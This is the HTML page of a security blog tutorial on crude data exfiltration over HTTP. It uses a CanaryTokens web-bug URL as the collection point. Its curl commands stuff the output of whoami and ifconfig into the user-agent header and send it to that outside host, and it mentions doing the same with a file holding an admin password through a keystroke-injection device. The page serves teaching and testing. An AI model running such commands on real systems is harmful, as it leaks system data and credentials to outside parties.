<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=/main.b9478d478cab804e9c38152e8f871e55017639e073e23c3482536d79ede530c1fe7dbcba6b751d74c13955ea8febea9c758b84c4395767f55cdf4397d70b067f.css integrity="sha512-uUeNR4yrgE6cOBUuj4ceVQF2OeBz4jw0glNtee3lMMH+fby6a3UddME5VeqP6+qcdYuExDlXZ/Vc30OX1wsGfw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=stylesheet href=/style.css><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>Easy Data Exfiltration with CanaryTokens - Alex Lynd</title><meta name=description content="Overview If you&amp;rsquo;re just getting started with data exfiltration, it might not be practical to set up an entire webserver or local environment just to try out some simple techniques, like web request exfiltration.
In my Hak5 episode, I created a simple proof-of-concept using an online tool called CanaryTokens, to demonstrate how simple it is to remotely exfiltrate a Linux password using a single command.
Using a keystroke injection tool called the USB Nugget, I created a payload that demonstrates this sneaky attack in seconds - but if you dont have one, you can still practice the exfiltration techniques with your web browser."><link rel=canonical href=/blog/easy-data-exfiltration-with-canarytokens/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Easy Data Exfiltration with CanaryTokens"><meta property="og:description" content="Overview If you&rsquo;re just getting started with data exfiltration, it might not be practical to set up an entire webserver or local environment just to try out some simple techniques, like web request exfiltration.
In my Hak5 episode, I created a simple proof-of-concept using an online tool called CanaryTokens, to demonstrate how simple it is to remotely exfiltrate a Linux password using a single command.
Using a keystroke injection tool called the USB Nugget, I created a payload that demonstrates this sneaky attack in seconds - but if you dont have one, you can still practice the exfiltration techniques with your web browser."><meta property="og:url" content="/blog/easy-data-exfiltration-with-canarytokens/"><meta property="og:site_name" content="Alex Lynd"><meta property="article:published_time" content="2022-08-27T11:07:26-07:00"><meta property="article:modified_time" content="2022-08-27T11:07:26-07:00"><meta property="og:image" content="/blog/easy-data-exfiltration-with-canarytokens/incident-map.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@alexlynd"><meta name=twitter:creator content="@alexlynd"><meta name=twitter:title content="Easy Data Exfiltration with CanaryTokens"><meta name=twitter:description content><meta name=twitter:image content="/blog/easy-data-exfiltration-with-canarytokens/incident-map.png"><meta name=twitter:image:alt content="Easy Data Exfiltration with CanaryTokens"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"/#/schema/organization/1","name":"Doks","url":"/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"/#/schema/image/1","url":"/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"/#/schema/image/1"}},{"@type":"WebSite","@id":"/#/schema/website/1","url":"/","name":"Alex Lynd","description":"Alex Lynd is a cybersecurity content creator, hardware hacker, and open-source product developer.","publisher":{"@id":"/#/schema/organization/1"}},{"@type":"WebPage","@id":"/blog/easy-data-exfiltration-with-canarytokens/","url":"/blog/easy-data-exfiltration-with-canarytokens/","name":"Easy Data Exfiltration with CanaryTokens","description":"","isPartOf":{"@id":"/#/schema/website/1"},"about":{"@id":"/#/schema/organization/1"},"datePublished":"2022-08-27T11:07:26CET","dateModified":"2022-08-27T11:07:26CET","breadcrumb":{"@id":"/blog/easy-data-exfiltration-with-canarytokens/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"/blog/easy-data-exfiltration-with-canarytokens/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["/blog/easy-data-exfiltration-with-canarytokens/"]}]},{"@type":"BreadcrumbList","@id":"/blog/easy-data-exfiltration-with-canarytokens/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"/","url":"/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@id":"/blogeasy-data-exfiltration-with-canarytokens/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"/#/schema/article/1","headline":"Easy Data Exfiltration with CanaryTokens","description":"","isPartOf":{"@id":"/blog/easy-data-exfiltration-with-canarytokens/"},"mainEntityOfPage":{"@id":"/blog/easy-data-exfiltration-with-canarytokens/"},"datePublished":"2022-08-27T11:07:26CET","dateModified":"2022-08-27T11:07:26CET","author":{"@id":"/#/schema/person/2"},"publisher":{"@id":"/#/schema/organization/1"},"image":{"@id":"/blog/easy-data-exfiltration-with-canarytokens/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"/blog/easy-data-exfiltration-with-canarytokens/#/schema/image/2","url":"/me.png","contentUrl":"/me.png","caption":"Easy Data Exfiltration with CanaryTokens"}]}]}</script><meta name=theme-color content="#fff"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest></head><body class="blog single"><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-lg-nowrap" aria-label="Main navigation"><a class="navbar-brand order-0" href=/ aria-label="Alex Lynd">Alex Lynd</a>
<button class="btn btn-menu order-2 d-block d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-lg-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-lg-none"></div><div class="offcanvas-header d-lg-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=/>Alex Lynd</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body p-4 p-lg-0"><ul class="nav flex-column flex-lg-row align-items-lg-center mt-2 mt-lg-0 ms-lg-2 me-lg-auto"><li class=nav-item><a class="nav-link ps-0 py-1 active" href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=/about/>About</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=/work/>Work</a></li></ul><hr class="text-black-50 my-4 d-lg-none"><form class="doks-search position-relative flex-grow-1 ms-lg-auto me-lg-2"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><hr class="text-black-50 my-4 d-lg-none"><ul class="nav flex-column flex-lg-row"><li class=nav-item><a class="nav-link social-link" href=https://github.com/AlexLynd><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-lg-none">GitHub</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://twitter.com/AlexLynd><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg><small class="ms-2 d-lg-none">Twitter</small></a></li></ul><hr class="text-black-50 my-4 d-lg-none"><button id=mode class="btn btn-link" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></div></div></nav></header></div><div class="wrap container-xxl" role=document><div class=content><article><div class="row justify-content-center"><div class="col-md-12 col-lg-10"><div class=blog-header><h1>Easy Data Exfiltration with CanaryTokens</h1><p><small>Posted&nbsp;on&nbsp;August 27, 2022 by <a class="stretched-link position-relative" href=/contributors/alex-lynd/>Alex Lynd</a>&nbsp;&dash;&nbsp;<strong>5&nbsp;min read</strong></small><p></div></div><div class=col-md-13><div><figure class=figure><img class="figure-img img-fluid lazyload blur-up" data-sizes=auto src=/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_e7a518419b07a3daea1de5fec82efebf.png data-srcset="/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_6c48f2b88d3c61e8207f72aa7456e13f.png 900w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_4f77aaa4b53f987a48b1a5b3707e4a89.png 800w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_ba5808bbea2609195b7253c4a65b04d7.png 700w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_05dfa7285fd54abe7bfcd172c1867354.png 600w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_9ea20e2c027f8acb7a0bce028e2ec1f1.png 500w" width=1270 height=715 alt="Easy Data Exfiltration with CanaryTokens"><noscript><img class="figure-img img-fluid" sizes=100vw srcset="/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_6c48f2b88d3c61e8207f72aa7456e13f.png 900w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_4f77aaa4b53f987a48b1a5b3707e4a89.png 800w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_ba5808bbea2609195b7253c4a65b04d7.png 700w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_05dfa7285fd54abe7bfcd172c1867354.png 600w,/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_9ea20e2c027f8acb7a0bce028e2ec1f1.png 500w" src=/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_1270x715_fill_box_center_3.png width=1270 height=715 alt="Easy Data Exfiltration with CanaryTokens"></noscript></figure></div></div><div class="col-md-12 col-lg-9"><hr><h3 id=overview>Overview <a href=#overview class=anchor aria-hidden=true></a></h3><p>If you&rsquo;re just getting started with data exfiltration, it might not be practical to set up an entire webserver or local environment just to try out some simple techniques, like web request exfiltration.</p><p><a href>In my Hak5 episode</a>, I created a simple proof-of-concept using an online tool called <a href>CanaryTokens</a>, to demonstrate how simple it is to remotely exfiltrate a Linux password using a single command.</p><p>Using a keystroke injection tool called the <a href>USB Nugget</a>, I created a payload that demonstrates this sneaky attack in seconds - but if you dont have one, you can still practice the exfiltration techniques with your web browser.</p><h3 id=what-youll-need>What You&rsquo;ll Need <a href=#what-youll-need class=anchor aria-hidden=true></a></h3><ul><li>A computer (Linux preferable)</li><li><a href=https://usbnugget.com>USB Nugget</a>, or other DuckyScript device</li></ul><div><iframe width=560 height=315 src=https://www.youtube.com/embed/T3szLSA83AU title="YouTube video player" frameborder=0 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div><hr><h3 id=what-is-data-exfiltration>What is Data Exfiltration? <a href=#what-is-data-exfiltration class=anchor aria-hidden=true></a></h3><p>Data exfiltration happens when a hacker needs to sneak sensitive data out of a compromised computer or network. This can often be difficult to detect, since there&rsquo;s a variety of tricky obfuscation methods an attacker can use to disguise sensitive information as something less conspicuous.</p><h3 id=hiding-data-in-plain-sight-web-traffic>Hiding Data in Plain Sight: Web Traffic <a href=#hiding-data-in-plain-sight-web-traffic class=anchor aria-hidden=true></a></h3><p>One common method of data exfiltration involves hiding data inside of HTTP web traffic. Since most network policies allow its users to browse the web, and since HTTP traffic (i.e. web requests) can usually comprise the majority of traffic on a network, it&rsquo;s hard to identify a single malicious source that&rsquo;s being used to exfiltrate data.</p><p>In addition, data obfuscation methods like <a href>steganography</a> can make it even harder to identify if sensitive information is being stolen in plain sight, especially if used in conjunction with encryption.</p><hr><h3 id=catching-hackers-with-canarytokens>Catching Hackers with CanaryTokens <a href=#catching-hackers-with-canarytokens class=anchor aria-hidden=true></a></h3><p><a href>CanaryTokens</a> is an awesome honeypot service developed by <a href>Thinkst Canary</a> that makes it easy to create bugged urls, documents, images, and more!</p><p>Typically, these honeypots can be used to determine if a hacker is snooping through your system, by leaving a juicy looking target somewhere that&rsquo;s easy for them to find. Since most hackers aren&rsquo;t manually scanning through your filesystem for credentials and secrets, they&rsquo;ll often use a program to enumerate (and subsequently exfiltrate) specific file types like images or documents with keywords like <em>password</em> or <em>cryptocurrency</em>, for example.</p><p>Thanks to CanaryTokens it&rsquo;s pretty easy to detect this activity, since you&rsquo;ll recieve an email if the hacker opens one of these bugged files!</p><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/canarytokens_hu47681332a9d2b002b241a15d27fcc2b1_104994_ee02f7a2fafe3f0a403e65125cb2a5c2.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/canarytokens_hu47681332a9d2b002b241a15d27fcc2b1_104994_8cd90deb246485f21e2ab876f9dffc94.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/canarytokens_hu47681332a9d2b002b241a15d27fcc2b1_104994_58440d85b83669faa14a3734e59733f0.webp 1080w, /blog/easy-data-exfiltration-with-canarytokens/canarytokens_hu47681332a9d2b002b241a15d27fcc2b1_104994_1146x0_resize_q75_h2_box_3.webp 1146w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/canarytokens_hu47681332a9d2b002b241a15d27fcc2b1_104994_1146x0_resize_q75_h2_box_3.webp alt="CanaryTokens website" title="You can create bugged images, Word documents, and more." width=1146 height=661></p><h3 id=weaponizing-canarytokens>Weaponizing CanaryTokens <a href=#weaponizing-canarytokens class=anchor aria-hidden=true></a></h3><p>One of my favorite unintended uses of CanaryTokens involves using the Incident Dashboard as a crude method of data exfiltration.</p><p>If you create a basic <code>web bug / URL token</code> as shown above, this dashboard lets you profile basic information about the system that clicks on your token, and even shows you the rough whereabouts using their Internet Service Provider.</p><p>Your unique link should look something like this:</p><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/canary-url_hu942acf09e241c7416e3cc0f72e46543f_16117_048cf7f55919944f15a681dac067dd7c.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/canary-url_hu942acf09e241c7416e3cc0f72e46543f_16117_774c2da0640996c803ebe3b080b9eb66.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/canary-url_hu942acf09e241c7416e3cc0f72e46543f_16117_732x0_resize_q75_h2_box_3.webp 732w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/canary-url_hu942acf09e241c7416e3cc0f72e46543f_16117_732x0_resize_q75_h2_box_3.webp title="Example web bug CanaryTokens url" width=732 height=121></p><p>The dashboard is super handy for determining every time there&rsquo;s a new &ldquo;hit&rdquo; on your CanaryToken - but can also be a great visual tool for trying out data exfiltration through web requests.</p><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_148089468c7c728d01c7f10dab3117b3.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_99b1d22dace5897d7ba5d3c3a07a2f97.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_e2d6ed40782e7a08b83884bb5f4ccd49.webp 1080w, /blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_1242x0_resize_q75_h2_box_3.webp 1242w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/incident-map_hue4f64d1ea9180b23da750fe6cba34378_725761_1242x0_resize_q75_h2_box_3.webp title="CanaryTokens Dashboard with Incident List & Map" width=1242 height=823></p><hr><h3 id=user-agent-strings>User Agent Strings <a href=#user-agent-strings class=anchor aria-hidden=true></a></h3><p>One key piece of information that&rsquo;s revealed about the &ldquo;victim&rdquo; through this dashboard is a metadata field called the <code>User-Agent String</code>, which reveals information about their machine such as the:</p><ul><li>Operating System</li><li>Browser type & version</li><li>Windowing system</li></ul><p>When browsing the web, this string is sent as a header in HTTP packets so websites can identify what kind of device you&rsquo;re using. This is makes it easy to render content for mobile devices, or serve downloads catered towards your operating system.</p><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/user-agent_hu7a4a8cc9b19f2f622cb8ab4023de46d6_24252_556eafaf1930691042207b4ccd48e5a2.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/user-agent_hu7a4a8cc9b19f2f622cb8ab4023de46d6_24252_7aa4983106b2a147d8f3238dfa75b34d.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/user-agent_hu7a4a8cc9b19f2f622cb8ab4023de46d6_24252_893x0_resize_q75_h2_box_3.webp 893w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/user-agent_hu7a4a8cc9b19f2f622cb8ab4023de46d6_24252_893x0_resize_q75_h2_box_3.webp title="The User-Agent String from my laptop, as detected by CanaryTokens" width=893 height=295></p><h3 id=custom-user-agents>Custom User-Agents <a href=#custom-user-agents class=anchor aria-hidden=true></a></h3><p>Since there&rsquo;s no strict format for UA Strings, this means we can set it to arbitrary text - and use this parameter as a crude method of plain-text data exfiltration!</p><p>We&rsquo;ll be trying this out by creating web-requests with a simple command-line tool called <code>curl</code>. You should be able to use it on Linux, Mac, or the latest version of Windows.</p><p>Try running the following command to make a request to your CanaryToken!</p><pre><code>curl https://canarytokens.org/yourtokenhere
</code></pre><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/curl-request_hucc8a22d25b19df169eec6420c97e5157_40442_542a212a85ae2597b845adea010b6f06.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/curl-request_hucc8a22d25b19df169eec6420c97e5157_40442_82f6b8fbd10afabdd2cfbeabe5f5d7e0.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/curl-request_hucc8a22d25b19df169eec6420c97e5157_40442_877x0_resize_q75_h2_box_3.webp 877w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/curl-request_hucc8a22d25b19df169eec6420c97e5157_40442_877x0_resize_q75_h2_box_3.webp title="A Boring User-Agent String from command-line tool Curl" width=877 height=326></p><p>Using the <code>-a</code> (agent) parameter, you can try sending the request with an arbitrary User Agent like <code>meow123456789</code>.</p><pre><code>curl https://canarytokens.org/yourtokenhere -a &quot;meow123456789&quot;
</code></pre><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/dashboard-custom-ua_huf4cb61ba035749c5826096b25605f859_11251_b03e78e9e78f13f9115967ef6ece57d2.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/dashboard-custom-ua_huf4cb61ba035749c5826096b25605f859_11251_2ecb318e4e287d01e370ab8648bb2d4c.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/dashboard-custom-ua_huf4cb61ba035749c5826096b25605f859_11251_870x0_resize_q75_h2_box_3.webp 870w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/dashboard-custom-ua_huf4cb61ba035749c5826096b25605f859_11251_870x0_resize_q75_h2_box_3.webp title="Custom User-Agent set through Curl" width=870 height=167></p><h3 id=crude-data-exfiltration>Crude Data Exfiltration <a href=#crude-data-exfiltration class=anchor aria-hidden=true></a></h3><p>As you can see, manipulating the user-agent string is fairly simple - so now let&rsquo;s try exfiltrating sensitive system information!</p><p>To do this, you can pass the output of another command to the User-Agent String by escaping it with <code>$(&lt;command>)</code> on Linux / Mac or <code>%command%</code> on Windows. For example, the following command sets the output of <code>whoami</code> as the user agent.</p><pre><code>curl https://canarytokens.org/yourtokenhere -a &quot;$(whoami)&quot;
</code></pre><p>If you want to try something a little fancier, you can create a command like <code>ifconfig | tr -d "\n"</code> which formats network information from the <code>ifconfig</code> command on a single line By running the following request, you can see the output on the CanaryTokens dashboard below!</p><pre><code>curl https://canarytokens.org/yourtokenhere -a &quot;$(ifconfig | tr -d '\n')&quot;
</code></pre><p><img class="img-fluid lazyload blur-up" srcset="/blog/easy-data-exfiltration-with-canarytokens/dashboard-network-info_hu18d1a7a4d9abb43aa9e5751e8f788498_193537_165abef971755ac3cdac5744f09fcab1.webp 480w, /blog/easy-data-exfiltration-with-canarytokens/dashboard-network-info_hu18d1a7a4d9abb43aa9e5751e8f788498_193537_b1ba71fd601a269b76d8ba726f3389e6.webp 720w, /blog/easy-data-exfiltration-with-canarytokens/dashboard-network-info_hu18d1a7a4d9abb43aa9e5751e8f788498_193537_866x0_resize_q75_h2_box_3.webp 866w" sizes=80vw src=/blog/easy-data-exfiltration-with-canarytokens/dashboard-network-info_hu18d1a7a4d9abb43aa9e5751e8f788498_193537_866x0_resize_q75_h2_box_3.webp title="Network info exfiltrated to CanaryTokens" width=866 height=521></p><p>In my video, I used this in order to exfiltrate the contents of a text file containing an administrator password - but you can get creative and try passing the output of other commands.</p><h3 id=conclusion--diving-deeper>Conclusion & Diving Deeper <a href=#conclusion--diving-deeper class=anchor aria-hidden=true></a></h3><p>While this demo makes it easy to visualize how web requests can pass sensitive information through spoofed parameters, it&rsquo;s pretty clear that this technique has limitations, and isn&rsquo;t the most practical in an actual data exfiltration scenario.</p><p>However, hackers <em>do</em> actually spoof user-agent fields when exfiltrating data - in order to masquerade exfiltration processes as normal web traffic, or sometimes even as a custom flag that can trigger actions from a C2 server.</p><p>In future tutorials, we&rsquo;ll explore some of these use-cases, and also advanced techniques like DNS exfiltration with CanaryTokens.</p><div class=mt-4><a class="btn btn-light" href=/tags/canarytokens/ role=button>CanaryTokens</a>
<a class="btn btn-light" href=/tags/duckyscript/ role=button>DuckyScript</a>
<a class="btn btn-light" href=/tags/data-exfiltration/ role=button>Data Exfiltration</a>
<a class="btn btn-light" href=/tags/usb-nugget/ role=button>USB Nugget</a></div></div></div></article></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Â© 2022 Alex Lynd / LyndLabs</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline><li class=list-inline-item><a href=/about/#contact-me>Contact Me</a></li></ul></div></div></div></footer><script src=/js/bootstrap.min.54bf0932b8a36d0e152b1635b099a6ef1394d35327e2437550a075c9c8ed1bd8aed5847c21b36fc02ed24014c031d9ca24017b0c78b1639d7e2fa8329898b842.js integrity="sha512-VL8JMrijbQ4VKxY1sJmm7xOU01Mn4kN1UKB1ycjtG9iu1YR8IbNvwC7SQBTAMdnKJAF7DHixY51+L6gymJi4Qg==" crossorigin=anonymous defer></script>
<script src=/js/highlight.min.56a414730f1135fe77b5ea30bf74a2cc4101a6f386e85e5b789c800570cc33d33054000f45932c053a59b41018f72687867254a80e1b9710671852492533162f.js integrity="sha512-VqQUcw8RNf53teowv3SizEEBpvOG6F5beJyABXDMM9MwVAAPRZMsBTpZtBAY9yaHhnJUqA4blxBnGFJJJTMWLw==" crossorigin=anonymous defer></script>
<script src=/main.min.162c56a0426544de0d010e66c56e321579655c400c9aae06a6823e7682de379adadf2165bd416fea191e4e7e410fbf1fd2c35a759aa43ff2e3787067669bf81b.js integrity="sha512-FixWoEJlRN4NAQ5mxW4yFXllXEAMmq4GpoI+doLeN5ra3yFlvUFv6hkeTn5BD78f0sNadZqkP/LjeHBnZpv4Gw==" crossorigin=anonymous defer></script>
<script src=/index.min.771f2e9655d5cf51ac648506c3b4967af53322731eaab2224a29c664e5c3075bc26161f50dcdcd2b752770e9cd919c9db9f60f7807453745012c158ee4382730.js integrity="sha512-dx8ullXVz1GsZIUGw7SWevUzInMeqrIiSinGZOXDB1vCYWH1Dc3NK3UncOnNkZydufYPeAdFN0UBLBWO5DgnMA==" crossorigin=anonymous defer></script></body></html>